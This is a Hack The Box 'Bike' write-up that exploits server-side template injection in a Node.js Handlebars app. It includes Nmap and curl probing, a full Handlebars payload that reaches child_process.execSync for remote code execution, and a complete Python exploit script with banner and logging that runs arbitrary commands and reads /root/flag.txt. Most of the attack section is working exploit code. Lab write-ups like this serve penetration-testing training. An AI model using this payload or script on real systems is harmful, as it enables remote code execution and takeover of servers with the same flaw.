# HTB Bike - SSTI Exploit Write-up

# Overview
**HTB Bike** is a *Hack The Box* machine that involves exploiting a **Server-Side Template Injection (SSTI)** vulnerability in a **Node.js Handlebars template engine**. This write-up provides a detailed walkthrough of the exploitation process and includes a fully automated **SQLmap-styled** exploit script.

---

# Enumeration

# **🔍 Nmap Scan**
We start by scanning the target with **Nmap**:

```bash
nmap -sC -sV -p- 10.129.6.196
```

This reveals:
- **Port 22 (SSH)** - Ignored (no creds available).
- **Port 80 (HTTP)** - Running an **Express.js** server.

### **🔍 Identifying SSTI**
When interacting with the email subscription form on the web page, our input is reflected back:

```html
We will contact you at: <input>
```

We test for **Server-Side Template Injection (SSTI)** using:

```bash
curl -X POST http://10.129.6.196/ -d "email={{7*7}}"
```

If the response contains `49`, **the site is vulnerable!** ✅

---

# Exploitation

# **🔗 Exploit Payload**
Using **Handlebars SSTI**, we craft a payload that executes system commands:

```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('whoami').toString();"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

This **bypasses sandboxing** and allows **Remote Code Execution (RCE)**!

---

# 🚀 Automating the Exploit

We use a **fully automated Python script** with:
✅ **SQLmap-style output**  
✅ **Fancy ASCII banner**  
✅ **JSON debugging for failed extractions**  

# **📜 Proof of Concept (PoC) Exploit Script**

```python
import requests
import re
import json
import time
import sys
from pyfiglet import Figlet

# Colors for output formatting (SQLmap-style)
RED = "\033[1;91m"
GREEN = "\033[1;92m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
CYAN = "\033[1;96m"
WHITE = "\033[1;97m"
RESET = "\033[0m"

# Target URL
TARGET = "http://10.129.6.196/"

# Headers for the request
HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Fancy banner
def print_banner():
    """Displays a fancy ASCII banner using pyfiglet."""
    f = Figlet(font="smmono9")  # Ensure this font is installed, or pick another
    banner_text = f.renderText("BikePwn")

    print(f"{CYAN}{banner_text}{RESET}")
    print("=" * 80)
    print(f"{CYAN}  Server-Side Template Injection Exploit - HTB Bike {RESET}")
    print(f"{CYAN}  Made by #AfterDark {RESET}")
    print("=" * 80)
    print(f"{YELLOW}[!] DISCLAIMER: Use this tool for authorized testing only. {RESET}")
    print(f"{YELLOW}    The author assumes no liability for misuse. {RESET}")
    print("=" * 80)

# Function to display SQLmap-style log messages
def log_message(level, message):
    timestamp = time.strftime("%H:%M:%S")
    symbols = {"INFO": f"{BLUE}[{timestamp}] [INFO] {RESET}",
               "SUCCESS": f"{GREEN}[{timestamp}] [SUCCESS] {RESET}",
               "WARNING": f"{YELLOW}[{timestamp}] [WARNING] {RESET}",
               "ERROR": f"{RED}[{timestamp}] [ERROR] {RESET}"}
    
    print(f"{symbols[level]}{message}")

# Function to check SSTI vulnerability
def check_ssti():
    payload = "{{7*7}}"
    data = {"email": payload}
    
    try:
        response = requests.post(TARGET, headers=HEADERS, data=data)
        if "49" in response.text or "error" in response.text:
            log_message("SUCCESS", "SSTI vulnerability detected!")
            return True
    except requests.exceptions.RequestException as e:
        log_message("ERROR", f"Connection error during SSTI check: {e}")
    
    log_message("WARNING", "SSTI does not seem to be present.")
    return False

# Function to execute a command via SSTI
def execute_command(cmd):
    """Executes a command using SSTI and prints debug info."""
    log_message("INFO", f"Executing command: {cmd}")

    ssti_payload = f"""{{{{#with "s" as |string|}}}}
{{{{#with "e"}}}}
{{{{#with split as |conslist|}}}}
{{{{this.pop}}}}
{{{{this.push (lookup string.sub "constructor")}}}}
{{{{this.pop}}}}
{{{{#with string.split as |codelist|}}}}
{{{{this.pop}}}}
{{{{this.push "return process.mainModule.require('child_process').execSync('{cmd}').toString();"}}}}
{{{{this.pop}}}}
{{{{#each conslist}}}}
{{{{#with (string.sub.apply 0 codelist)}}}}
{{{{this}}}}
{{{{/with}}}}
{{{{/each}}}}
{{{{/with}}}}
{{{{/with}}}}
{{{{/with}}}}
{{{{/with}}}}"""

    data = {"email": ssti_payload}

    try:
        response = requests.post(TARGET, headers=HEADERS, data=data, timeout=10)
        return response.text.strip()
    except requests.exceptions.RequestException as e:
        log_message("ERROR", f"Connection error: {e}")
        return "[-] Command execution failed."

# Function to get the flag
def get_flag():
    log_message("INFO", "Fetching flag from /root/flag.txt")
    flag = execute_command("cat /root/flag.txt")

    if len(flag) > 5:
        log_message("SUCCESS", f"Flag: {flag}")
    else:
        log_message("WARNING", "Could not retrieve the flag.")

# Main function
def main():
    print_banner()
    
    log_message("INFO", "Starting SSTI Exploit for Bike HTB Machine")

    if check_ssti():
        log_message("INFO", "Checking user privileges...")
        user = execute_command("whoami")
        log_message("SUCCESS", f"Running as: {user}")

        get_flag()
    else:
        log_message("ERROR", "SSTI exploitation failed.")

if __name__ == "__main__":
    main()
```

---

# 📜 Conclusion
This challenge demonstrates **how dangerous SSTI can be**, especially in **Node.js-based applications**. The exploit works by **breaking out of the Handlebars sandbox** and gaining **full system control**.

---
🛠️ **Credits:**  
💀 Developed by **#AfterDark**  
🔗 [CyberDepot](https://infosec-db.github.io/CyberDepot/) - More Exploits & Writeups  
